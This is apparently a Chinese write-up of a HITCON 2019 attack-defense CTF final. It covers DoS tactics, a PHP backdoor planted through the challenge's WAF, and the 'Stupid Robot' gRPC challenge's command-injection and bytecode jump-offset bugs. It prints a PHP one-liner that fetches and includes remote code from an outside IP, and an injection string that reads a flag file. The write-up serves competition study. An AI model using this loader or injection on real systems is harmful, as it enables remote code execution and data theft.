我一直说，AWD Web题最大的攻击点根本不是拿到flag，而是打down服务。打down其他队伍的服务才是最大的攻击。而这个Web也是可以攻击的。

整个题目的DOS思路应该有三种，修改SECURITY_KEY、删除数据库、打down FPM。比赛的时候，我后面主要打了前两者。不过，那时候因为慢了几分钟，打的时候，大家已经都挂了。

回顾：

- 由于手速慢，导致后面打RCE的时候，晚了10分钟。这10分钟直接导致这个题目打的很不理想。3点会闭榜，两分半钟一轮。这个时候，应该是P4？向全场打了一波DoS，应该是修改了SECURITY_KEY。这个时候，直接导致全场的服务down机，而且还使我们后面的RCE没办法攻击，这让我们打的非常被动，赛场压力非常大。

- 高压下，思维不够稳定与活跃。主办方的加waf策略，其实是可以利用的。我们可以给自己的waf写一个一句话md5木马。这样就可以通过后门管理自己的服务器了。并且，还可以通过waf来动态加载长度超过限制的waf.php。这个思路一开始一直没想到，在比赛最后才想到。这个想想实在是不应该，值得反思。

  ```php
  <?php if (!file_exists(“/tmp/.moxiaoxi.php”) || abs(time() - filemtime(“/tmp/.moxiaoxi.php”)) > 15) copy(“https://10.0.3.220:8227/moxiaoxi.php”, “/tmp/.moxiaoxi.php”); include “/tmp/.moxiaoxi.php”;
  ```

  当时，一直觉得没有rce没办法给自己的服务器写文件，因此没办法使用这种动态加载的方法。其实，仔细思考就会发现，我们的waf.php就是一个给选手的后门。我们可以利用waf.php先给自己种一个后门。



----

## Stupid Robot

这个题目是我们能够夺冠的主要关键。因为针对这个题目，我们实现了一套隐蔽的混淆策略，导致大家都没办法重放我们的流量。这个题目，我们获得了28259分，而其他队伍最高也只有3921分，被带飞。

这个题目是一个建立在HTTP2上用GRPC通信的服务，主要有三个漏洞，第一个是命令注入(`/calc 1+1" | cat /home/stupid_robot/flag; echo "..............`)，就是第一天大家打的。

Riatre:

> 另外两个利用点处在bytecode翻译成jvm bytecode过程中，题目会对我们发出去的指令进行计算，并记录这条指令之前所有指令转译的时候，需要多出n条JVM指令。因此，跳转时，主要跳转我们发过去的指令（jump index+n）
>
> 第一个bug是有一条指令（newarray）的处理里，if else 判断了protobuf里enum定义的三种类型，但是没有default case。
>
> 而protobuf的一个特点是双向向后兼容，所以我们可以给服务端发enum里本来没定义的值，只要客户端进行了定义即可。
>
> 此时，服务端在处理的时候本来是该插3条指令进去，但记录附加指令数为2。因为实际插两条进去，这会导致后面所有的跳转目标都会偏移一条jvm指令。
>
> 第二个bug是在tableswitch和lookupswitch，这两个指令里面分别有一个客户端发过去的偏移量字段，而根本没有检查实际多出来多少的表。
>
> 此外，存在一个Machineid指令，用于判断Robot是否是admin。如果是admin的话，就返回flag。但是，打开admin模式，需要提供flag的sha256。因此，正常情况下，该逻辑失效。
>
> 但是，我们可以通过跳转偏移的bug，跳过Machinied指令实际实现的前三条jvm指令，这样就能跳过admin判断。

首先，可以通过https://github.com/gajendrakmr/ProtoBuff-Fuzzing直接从jar中导出proto.

```java
syntax = "proto3";
package robot;
option java_multiple_files = true;
option java_package = "ctf.hitcon.robot";
service Robot {
    rpc Send(stream CommandRequest) returns (stream CommandResponse);
}
message CommandRequest {
    oneof data {
        string message = 1;
        Code code = 2;
    }
}
message CommandResponse {
    string response = 1;
}
message Add {
    Type type = 1;
}
message Sub {
    Type type = 1;
}
message Mul {
    Type type = 1;
}
message Div {
    Type type = 1;
}
message Rem {
    Type type = 1;
}
message Xor {
    
}
message And {
    
}
message Or {
    
}
message Neg {
    
}
message Aconstnull {
    
}
message Dup {
    
}
message Swap {
    
}
message Nop {
    
}
message Pop {
    
}
message Store {
    int32 index = 1;
    Type type = 2;
}
message Load {
    int32 index = 1;
    Type type = 2;
}
message Ldc {
    oneof constant {
        string stringConst = 1;
        int32 intConst = 2;
        float floatConst = 3;
    }
}
message Return {
    Type type = 1;
}
message Goto {
    int32 offset = 1;
}
message If {
    int32 offset = 1;
    Ord order = 2;
}
message Ificmp {
    int32 offset = 1;
    Ord order = 2;
}
message Ifnull {
    int32 offset = 1;
}
message Tableswitch {
    int32 min = 1;
    int32 max = 2;
    int32 defaultOffset = 3;
    repeated int32 labelOffset = 4;
}
message Lookupswitch {
    int32 defaultOffset = 1;
    repeated int32 keys = 2;
    repeated int32 labelOffset = 3;
}
message Aload {
    Type type = 1;
}
message Astore {
    Type type = 1;
}
message Newarray {
    Type type = 1;
}
message Arraylength {
    
}
message I2b {
    
}
message Bastore {
    
}
message Baload {
    
}
message Newbytearray {
    
}
message Stringconcat {
    
}
message I2s {
    
}
message F2s {
    
}
message S2i {
    
}
message S2f {
    
}
message B2s {
    
}
message Readfile {
    int32 num = 1;
}
message Writefile {
    int32 num = 1;
}
message Time {
    
}
message Getrandom {
    
}
message Machineid {
    
}
message Instruction {
    oneof opcode {
        Load load = 1;
        Ldc ldc = 2;
        Return return = 3;
        Aconstnull aconstnull = 4;
        Add add = 5;
        Sub sub = 6;
        Mul mul = 7;
        Div div = 8;
        Rem rem = 9;
        Xor xor = 10;
        And and = 11;
        Or or = 12;
        Neg neg = 13;
        Store store = 14;
        Dup dup = 15;
        Swap swap = 16;
        Nop nop = 17;
        Pop pop = 18;
        Goto goto = 19;
        If if = 20;
        Ificmp ificmp = 21;
        Ifnull ifnull = 22;
        Tableswitch tableswitch = 23;
        Lookupswitch lookupswitch = 24;
        Aload aload = 25;
        Astore astore = 26;
        Newarray newarray = 27;
        Arraylength arraylength = 28;
        I2b i2b = 29;
        Bastore bastore = 30;
        Baload baload = 31;
        Newbytearray newbytearray = 32;
        Stringconcat stringconcat = 33;
        I2s i2s = 34;
        F2s f2s = 35;
        S2i s2i = 36;
        S2f s2f = 37;
        B2s b2s = 38;
        Readfile readfile = 39;
        Writefile writefile = 40;
        Time time = 41;
        Getrandom getrandom = 42;
        Machineid machineid = 43;
    }
}
message Code {
    repeated Instruction instructions = 1;
    string token = 2;
}
enum Type {
    INT = 0;
    FLOAT = 1;
    STRING = 2;
}
enum Ord {
    EQ = 0;
    NE = 1;
    LT = 2;
    GE = 3;
    LE = 4;
    GT = 5;
}
```

因此，我们攻击的主要流程大概是，先发一个命令注入的请求过去。然而，我们的exploit会改写handler，并绕过了他bytecode的一些限制，导致可以入读flag。我们打开了grpc压缩，并通过很长的请求来触发压缩。

这样，我们只要随便发送一个请求过去触发改写的handler就可以得到flag。

我们利用的时候，主要发送了第一个被打烂的攻击流量，但是我们在返回flag的时候，返回了命令注入失败的返回结果，并在后面加上混淆成0x20-0x30范围内的flag。这个时候，在Wireshark中观察流量，大概率只会以为命令注入失败了。而且，返回的flag，我们自定义实现了一个奇怪的xor加密，让其他选手比较难分析。从而重放我们的流量。

流量如下：

![9301576583757_.pic_hd](https://momomoxiaoxi.com/img/post/HITCON2019/9301576583757_.pic_hd.jpg)



事后和hear7v讨论，他提起或许可以通过APP jar包调用的方式，进行调试这种无源码的jar文件。不过，因为这个jar代码进行了混淆，导致效果不是很好。

![WechatIMG945](https://momomoxiaoxi.com/img/post/HITCON2019/WechatIMG945.jpeg)

----

以上，希望有所帮助：）

